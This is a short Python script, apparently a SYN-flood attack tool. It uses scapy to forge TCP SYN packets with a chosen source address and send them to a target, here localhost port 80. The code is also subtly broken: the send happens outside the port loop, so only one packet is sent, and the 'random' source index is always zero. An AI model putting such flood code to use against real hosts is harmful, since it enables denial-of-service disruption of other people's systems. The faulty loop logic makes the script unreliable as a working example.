import random
from scapy.all import *
from scapy.layers.inet import IP, TCP


def synFlood(tgt, dPort):
    srcList = ['127.0.0.1']
    for sPort in range(1024, 65535):
        index = random.randrange(1)
    ipLayer = IP(src=srcList[index], dst=tgt)
    tcpLayer = TCP(sport=sPort, dport=dPort, flags="S")
    packet = ipLayer / tcpLayer
    send(packet)


synFlood('127.0.0.1', 80)
